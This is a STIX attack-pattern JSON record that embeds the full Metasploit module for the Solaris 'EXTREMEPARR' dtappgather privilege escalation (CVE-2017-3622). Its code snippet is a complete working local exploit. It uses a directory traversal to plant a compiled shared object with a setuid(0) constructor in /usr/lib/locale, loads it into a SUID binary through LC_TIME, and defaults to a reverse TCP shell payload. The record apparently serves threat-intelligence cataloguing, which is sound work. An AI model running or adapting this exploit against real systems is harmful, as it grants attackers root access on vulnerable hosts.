{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--c04a8e6e-b7ac-4b2b-a4f3-2cd42b63a9b9",
    "created": "2024-08-14T16:34:01.858784Z",
    "modified": "2024-08-14T16:34:01.858788Z",
    "name": "\"Solaris EXTREMEPARR dtappgather Privilege Escalation\"",
    "description": " This module exploits a directory traversal vulnerability in the `dtappgather` executable included with Common Desktop Environment (CDE) on unpatched Solaris systems prior to Solaris 10u11 which allows users to gain root privileges.  dtappgather allows users to create a user-owned directory at any location on the filesystem using the `DTUSERSESSION` environment variable.  This module creates a directory in `/usr/lib/locale`, writes a shared object to the directory, and runs the specified SUID binary with the shared object loaded using the `LC_TIME` environment variable.  This module has been tested successfully on:  Solaris 9u7 (09/04) (x86); Solaris 10u1 (01/06) (x86); Solaris 10u2 (06/06) (x86); Solaris 10u4 (08/07) (x86); Solaris 10u8 (10/09) (x86); Solaris 10u9 (09/10) (x86).  'References'     => [ ['BID', '97774']",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/solaris/local/extremeparr_dtappgather_priv_esc.rb",
            "external_id": "extremeparr_dtappgather_priv_esc.rb"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/HackerFantastic/Public/blob/master/exploits/dtappgather-poc.sh"
        },
        {
            "source_name": "reference",
            "url": "http://www.oracle.com/technetwork/security-advisory/cpuapr2017-3236618.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = ExcellentRanking\n\n  include Msf::Post::File\n  include Msf::Post::Solaris::Priv\n  include Msf::Post::Solaris::System\n  include Msf::Post::Solaris::Kernel\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => \"Solaris 'EXTREMEPARR' dtappgather Privilege Escalation\",\n      'Description'    => %q{\n        This module exploits a directory traversal vulnerability in the\n        `dtappgather` executable included with Common Desktop Environment (CDE)\n        on unpatched Solaris systems prior to Solaris 10u11 which allows users\n        to gain root privileges.\n\n        dtappgather allows users to create a user-owned directory at any\n        location on the filesystem using the `DTUSERSESSION` environment\n        variable.\n\n        This module creates a directory in `/usr/lib/locale`, writes a shared\n        object to the directory, and runs the specified SUID binary with the\n        shared object loaded using the `LC_TIME` environment variable.\n\n        This module has been tested successfully on:\n\n        Solaris 9u7 (09/04) (x86);\n        Solaris 10u1 (01/06) (x86);\n        Solaris 10u2 (06/06) (x86);\n        Solaris 10u4 (08/07) (x86);\n        Solaris 10u8 (10/09) (x86);\n        Solaris 10u9 (09/10) (x86).\n      },\n      'References'     =>\n        [\n          ['BID', '97774'],\n          ['CVE', '2017-3622'],\n          ['EDB', '41871'],\n          ['URL', 'https://github.com/HackerFantastic/Public/blob/master/exploits/dtappgather-poc.sh'],\n          ['URL', 'http://www.oracle.com/technetwork/security-advisory/cpuapr2017-3236618.html']\n        ],\n      'Notes'          => {\n        'Stability' => [CRASH_SAFE],\n        'SideEffects' => [],\n        'Reliability' => [],\n        'AKA' => ['EXTREMEPARR'] },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Shadow Brokers',   # exploit\n          'Hacker Fantastic', # dtappgather-poc.sh\n          'bcoles'     # Metasploit\n        ],\n      'DisclosureDate' => '2017-04-24',\n      'Privileged'     => true,\n      'Platform'       => ['solaris', 'unix'],\n      'Arch'           => [ARCH_X86, ARCH_X64, ARCH_SPARC],\n      'Targets'        => [['Auto', {}]],\n      'SessionTypes'   => ['shell', 'meterpreter'],\n      'DefaultOptions' =>\n        {\n          'PAYLOAD'     => 'solaris/x86/shell_reverse_tcp',\n          'WfsDelay'    => 10,\n          'PrependFork' => true\n        },\n      'DefaultTarget'  => 0))\n    register_options [\n      # Some useful example SUID executables:\n      # * /usr/bin/at\n      # * /usr/bin/cancel\n      # * /usr/bin/chkey\n      # * /usr/bin/lp\n      # * /usr/bin/lpset\n      # * /usr/bin/lpstat\n      # * /usr/lib/lp/bin/netpr\n      # * /usr/sbin/lpmove\n      OptString.new('SUID_PATH', [true, 'Path to suid executable', '/usr/bin/at']),\n      OptString.new('DTAPPGATHER_PATH', [true, 'Path to dtappgather executable', '/usr/dt/bin/dtappgather'])\n    ]\n    register_advanced_options [\n      OptString.new('WritableDir', [true, 'A directory where we can write files', '/tmp'])\n    ]\n  end\n\n  def suid_bin_path\n    datastore['SUID_PATH']\n  end\n\n  def dtappgather_path\n    datastore['DTAPPGATHER_PATH']\n  end\n\n  def mkdir(path)\n    vprint_status \"Creating directory '#{path}'\"\n    cmd_exec \"mkdir -p '#{path}'\"\n    register_dir_for_cleanup path\n  end\n\n  def upload(path, data)\n    print_status \"Writing '#{path}' (#{data.size} bytes) ...\"\n    rm_f path\n    write_file path, data\n    register_file_for_cleanup path\n  end\n\n  def upload_and_compile(path, data)\n    upload \"#{path}.c\", data\n\n    output = cmd_exec \"PATH=$PATH:/usr/sfw/bin/:/opt/sfw/bin/:/opt/csw/bin gcc -fPIC -shared -g -lc -o #{path} #{path}.c\"\n    unless output.blank?\n      print_error output\n      fail_with Failure::Unknown, \"#{path}.c failed to compile\"\n    end\n\n    register_file_for_cleanup path\n  end\n\n  def symlink(link_target, link_name)\n    vprint_status \"Symlinking #{link_target} to #{link_name}\"\n    rm_f link_name\n    cmd_exec \"ln -sf #{link_target} #{link_name}\"\n    register_file_for_cleanup link_name\n  end\n\n  def check\n    [dtappgather_path, suid_bin_path].each do |path|\n      unless setuid? path\n        vprint_error \"#{path} is not setuid\"\n        return CheckCode::Safe\n      end\n      vprint_good \"#{path} is setuid\"\n    end\n\n    unless has_gcc?\n      vprint_error 'gcc is not installed'\n      return CheckCode::Safe\n    end\n    vprint_good 'gcc is installed'\n\n    version = kernel_release\n    if version.to_s.eql? ''\n      vprint_error 'Could not determine Solaris version'\n      return CheckCode::Detected\n    end\n\n    unless Rex::Version.new(version).between? Rex::Version.new('5.7'), Rex::Version.new('5.10')\n      vprint_error \"Solaris version #{version} is not vulnerable\"\n      return CheckCode::Safe\n    end\n    vprint_good \"Solaris version #{version} appears to be vulnerable\"\n\n    CheckCode::Appears\n  end\n\n  def exploit\n    if is_root?\n      fail_with Failure::BadConfig, 'Session already has root privileges'\n    end\n\n    unless writable? datastore['WritableDir']\n      fail_with Failure::BadConfig, \"#{datastore['WritableDir']} is not writable\"\n    end\n\n    # Remove appmanager directory and contents\n    appmanager_path = '/var/dt/appconfig/appmanager'\n    vprint_status \"Cleaning appmanager directory #{appmanager_path}\"\n    cmd_exec \"chmod -R 755 #{appmanager_path}/*\"\n    cmd_exec \"rm -rf #{appmanager_path}/*\"\n    rm_f appmanager_path\n\n    # Create writable directory in /usr/lib/locale\n    locale_path = '/usr/lib/locale'\n    locale_name = rand_text_alphanumeric 5..10\n    new_dir = \"#{locale_path}/#{locale_name}\"\n    vprint_status \"Creating directory #{new_dir}\"\n    depth = 3\n    cmd_exec \"DTUSERSESSION=. /usr/dt/bin/dtappgather\"\n    depth.times do\n      cmd_exec \"DTUSERSESSION=.. /usr/dt/bin/dtappgather\"\n    end\n    symlink locale_path, appmanager_path\n    cmd_exec \"DTUSERSESSION=#{locale_name} #{dtappgather_path}\"\n    unless cmd_exec(\"ls -al #{locale_path} | grep #{locale_name}\").to_s.include? locale_name\n      fail_with Failure::NotVulnerable, \"Could not create directory #{new_dir}\"\n    end\n\n    print_good \"Created directory #{new_dir}\"\n    register_dir_for_cleanup new_dir\n\n    rm_f appmanager_path\n    cmd_exec \"chmod 755 #{new_dir}\"\n\n    # Upload and compile shared object\n    base_path = \"#{datastore['WritableDir']}/.#{rand_text_alphanumeric 5..10}\"\n    mkdir base_path\n\n    payload_name = \".#{rand_text_alphanumeric 5..10}\"\n    payload_path = \"#{base_path}/#{payload_name}\"\n\n    so = <<-EOF\n      void __attribute__((constructor)) cons() {\n        setuid(0);\n        setgid(0);\n        execle(\"#{payload_path}\", \"\", 0, 0);\n        _exit(0);\n      }\n    EOF\n\n    so_name = \".#{rand_text_alphanumeric 5..10}\"\n    so_path = \"#{base_path}/#{so_name}\"\n    upload_and_compile so_path, so\n\n    vprint_status \"Writing shared objects to #{new_dir}\"\n    cmd_exec \"cp '#{so_path}' '#{new_dir}/#{locale_name}.so.2'\"\n    register_file_for_cleanup \"#{new_dir}/#{locale_name}.so.2\"\n    cmd_exec \"cp '#{so_path}' '#{new_dir}/#{locale_name}.so.3'\"\n    register_file_for_cleanup \"#{new_dir}/#{locale_name}.so.3\"\n\n    # Upload and execute payload\n    upload payload_path, generate_payload_exe\n    cmd_exec \"chmod +x #{payload_path}\"\n\n    print_status 'Executing payload...'\n    cmd_exec \"LC_TIME=#{locale_name} #{suid_bin_path} & echo \"\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2017-04-24",
    "x_mitre_platforms": [
        "['solaris', 'unix']"
    ]
}